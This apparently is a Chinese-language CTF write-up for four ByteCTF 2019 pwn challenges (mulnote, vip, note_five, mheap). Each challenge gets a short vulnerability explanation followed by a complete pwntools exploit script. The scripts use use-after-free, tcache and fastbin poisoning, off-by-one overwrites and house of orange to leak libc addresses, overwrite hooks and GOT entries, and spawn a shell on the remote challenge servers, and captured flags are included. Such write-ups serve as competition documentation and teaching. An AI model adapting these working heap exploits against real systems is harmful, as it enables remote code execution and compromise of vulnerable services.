---
title: ByteCTF
date: 2019-09-10 19:18:58
tags:
---
ByteCTF Pwn
<!--more-->
# mulnote
这题特点是比较难逆向,但是发现有很多队伍很快就做出来了我就感觉应该挺简单的于是直接边逆边猜,发现是启动线程free的其中在free结束后还有睡了8秒再清空指针于是这题就没什么价值了直接UAF就可以了.这里就不多说了.
```python
from pwn import *
def cmd(c):
	p.sendlineafter(">",str(c))
def add(size,c="A"):
	cmd("C")
	p.sendlineafter(">",str(size))
	p.sendafter(">",c)
def edit(idx,c):
	cmd("E")
	cmd(idx)
	p.sendafter(">",c)
def show():
	cmd("S")
def free(idx):
	cmd("R")
	cmd(idx)
context.log_level='debug'
context.arch='amd64'
libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
#p=process('./mulnote')
p=remote("112.126.101.96",9999)
add(0x88)#0
add(0x68)#1
free(0)
show()
p.readuntil(":\n")
base=u64(p.readline()[:-1].ljust(0x8,'\x00'))-(0x7f39a22bbb78-0x7f39a1ef7000)
log.warning(hex(base))
add(0x88)#2
add(0x68,"A"*0x18)#3
add(0x68)#4
free(4)
free(3)
edit(3,p64(libc.sym['__malloc_hook']+base-35))
add(0x68)
one=0x4526a
add(0x68,"\x00"*19+p64(one+base))
p.readuntil("[Q]uit\n")

cmd(1)
#gdb.attach(p,'b free')
#free(2)
"""
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
#free(5)
p.interactive('n132>')
```
# vip
这题比较难受的一点是我估计是非预期了因为没用到他的vip函数...
主要难点是一开始时 `edit` 输入的数据都是随机的但是长度可以控制可以`show`.通过长度递减可以依次设置好fd的第4，3，2，1字节为自己想要的值.
没有开PIE所以可以通过`tcache atk` 控制bss,再通过`edit`充填控制bss上的`edit开关`之后就是简单的堆溢出了.
```python
from pwn import *
def cmd(c):
	p.sendlineafter("e: ",str(c))
def add(idx):
	cmd(1)
	p.sendlineafter("x: ",str(idx))
def free(idx):
	cmd(3)
	p.sendlineafter("x: ",str(idx))
def edit(idx,size):
	cmd(4)
	p.sendlineafter("x: ",str(idx))
	cmd(size)
def show(idx):
	cmd(2)
	p.sendlineafter("x: ",str(idx))
def vip(n):
	cmd(6)
	p.sendafter(": \n",n)

#p=process('./vip')
p=remote("112.126.103.14",9999)
"""
vip('A'*0x10)
p.readuntil("A"*0x10)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dcc2a0-0x7ffff79e4000)
log.warning(hex(base))
"""
def safe_read(n,need,pad=0x60+4):
	data=p.readline()
	if(len(data)!=0x60+4):
		return 0
	print hex(ord(need)),hex(ord(data[0x64+n-1]))
	if(data[0x64+n-1]==need):
		return 1
	return 0
add(0)
add(1)
add(2)
add(3)
add(4)
add(5)
free(5)
free(4)
res=0
while(res==0):
	edit(0,0x60*4+4)
	show(3)
	data=p.readline()
	if(len(data)==0x64):
		res=1
res=0

while(res==0):
	edit(3,0x60+3)
	show(3)
	#gdb.attach(p)
	data=p.readline()
	if(len(data)!=0x64):
		continue
	tmp=ord(data[0x64-2])
	print tmp
	if(tmp==0x40):
		res=1

context.log_level='debug'
res=0
while(res==0):
	edit(2,0x60*2+2)
	show(3)
	res=safe_read(-2,'\x40')

res=0
while(res==0):
	edit(3,0x60*1+1)
	show(3)
	data=p.readline()
	if(len(data)!=0x64):
		continue
	tmp=ord(data[0x64-4])
	print tmp
	if(tmp<=0xe3 and tmp>=0xc8):
		res=1

add(4)
add(5)
edit(5,0xe8-tmp)

add(0)
add(1)
add(2)
free(2)
free(1)
edit(0,0x68+0x80+0x28)
p.sendafter(": ",'A'*0x58+p64(0x91)+p64(0x404100)+'\x00'*0x80+p64(0x21)*5)
add(4)
add(5)


edit(5,0x18)
got=0x000000000404018
puts=0x000000000401040
atoi=0x000000000404070
p.sendafter(": ",p64(got)+p64(atoi)*2)
edit(0,8)
p.sendafter(": ",p64(puts))
free(1)
base=u64(p.readline()[:-1].ljust(0x8,'\x00'))-(0x7ffff7a24680-0x7ffff79e4000)
log.warning(hex(base))
edit(2,8)
p.sendafter(": ",p64(0x4f440+base))
p.sendline("/bin/sh\x00")
#p.sendline("cat flag*\n")
#gdb.attach(p)
p.interactive()
```
之后如果有时间研究一下他的预期解法.
# note_five

全保护漏洞点是`edit`处`off_by_one`主要限制是`malloc大小`
因为没法获得size为0x70的chunk所以想要想办法控制`global_fast_max`之后在做`fast_bin_atk`控制`stdout`之后任意地址`leak`
再之后通过`edit`改掉`stderr`的`chain`指向可控区域通过`house of orange` 获得`shell`

```python
from pwn import *
def cmd(c):
    p.sendlineafter(">> ",str(c))
def add(idx,size):
    cmd(1)
    p.sendlineafter(": ",str(idx))
    p.sendlineafter(": ",str(size))
def free(idx):
    cmd(3)
    p.sendlineafter(": ",str(idx))
def edit(idx,c):
    cmd(2)
    p.sendlineafter(": ",str(idx))
    p.sendafter(": ",c)
#
context.arch='amd64'
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
#libc=ELF("./libc.so")
p=process('./note_five')
#p=remote("112.126.103.195",9999)
context.log_level='debug'
nop=0x3f8
add(0,nop)
add(1,0x98)
add(2,0x98)
add(3,0x98)
add(4,0x98)
edit(0,'A'*nop+'\xf1')
edit(1,"A"*0x98+'\xa1')
edit(2,p64(0x21)*18+'\x21'+'\n')
free(1)
add(1,0xe8)

add(0,0x98)
edit(4,'\x00'*0x98+'\xf1')
add(4,0x300)
edit(4,p64(0x21)*61+'\x21'+'\n')
free(0)
add(0,0xe8)
edit(0,'\x00'*0x98+p64(0xf1)+'\n')

free(2)
edit(1,'\x00'*0x98+p64(0xa1)+p64(0)+'\xe8\x37\n')
add(3,0x98)

free(4)
edit(0,'\x00'*0x98+p64(0xf1)+'\xcf\x25'+'\n')
add(0,0xe8)
add(0,0xe8)
edit(0,'\x00'*0x41+p64(0x1800)+'\x00'*0x19+'\n')
p.read(0x40)
base=u64(p.read(8))-(0x7ffff7dd2600-0x7ffff7a0d000)
libc.address=base
#gdb.attach(p,'')
AAA=0x7ffff7dd3f58-0x7ffff7a0d000+base
edit(0,'\x00'*0x41+p64(0x1800)+'\x00'*0x18+p64(AAA)+p64(AAA+8)+'\n')
#edit(0,'\x00'*0x41+p64(0x1800)+'\x00'*0x19+'\n')
heap=u64(p.read(8))

log.warning(hex(heap))
log.warning(hex(base))

fio=0x0000555555757410-0x555555778000+heap
fake = "/bin/sh\x00"+p64(0x61)+p64(libc.symbols['system'])+p64(libc.symbols['_IO_list_all']-0x10)+p64(0)+p64(1)
fake =fake.ljust(0xa0,'\x00')+p64(fio+0x8)
fake =fake.ljust(0xc0,'\x00')+p64(1)
fake = fake.ljust(0xd8, '\x00')+p64(fio+0xd8-0x10)+p64(libc.symbols['system'])

edit(1,fake+'\n')
edit(0,'\x00'*0x41+p64(0x1800)+p64(0x7ffff7dd26a3-0x7ffff7a0d000+base)*8+p64(0)*4+p64(fio)+'\n')



cmd(4)
p.interactive('n132>')
#bytectf{3c0a56db0867194e6157834f8fd76848}
```
# mheap
这里的do_read很有意思...看了好久才发现有点问题.
```arm
 do
  {
    result = v3;
    if ( (signed int)v3 >= a2 )
      break;
    v4 = read(0, (void *)(a1 + (signed int)v3), (signed int)(a2 - v3));
    if ( !v4 )
      exit(0);
    v3 += v4;
    result = *(unsigned __int8 *)((signed int)v3 - 1LL + a1);
  }
  while ( (_BYTE)result != 10 );
```
这里只有检查v4是不是0但是read失败返回的是-1这样的话v3会变少于是导致了向低地址越界写.
很难发现.发现之后就变得比较简单了.
```python
from pwn import *
def cmd(c):
	p.sendlineafter(": ",str(c))
def add(idx,size,c='A\n'):
	cmd(1)
	cmd(idx)
	cmd(size)
	p.sendafter(": ",c)
def show(idx):
	cmd(2)
	cmd(idx)
def free(idx):
	cmd(3)
	cmd(idx)
def edit(idx,c):
	cmd(4)
	cmd(idx)
	p.send(c)
context.log_level='debug'
p=process('./mheap')
#p=remote("112.126.98.5",9999)
add(0,0x800,"A"*0x3+'\n')
add(1,0x790,"X"*0x10+'\n')
add(2,0x20,"T"*0x20)

free(1)
free(2)
add(3,0x50,p64(0x30)+p64(0x0000000004040d0)+'\xff'*0x3f+'\n')
add(4,0x23330fb0-0x10,"A\n")
atoi=0x000000000404050
puts=0x000000000404018
edit(4,p64(puts)+p64(atoi))
show(1)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7a24680-0x7ffff79e4000)
edit(1,p64(0x4f440+base)+'\n')
log.warning(hex(base))
#gdb.attach(p,'b *0x0000000004011EA')

cmd("/bin/sh\x00")

p.interactive()
#bytectf{34f7e6dd6acf03192d82f0337c8c54ba}
```
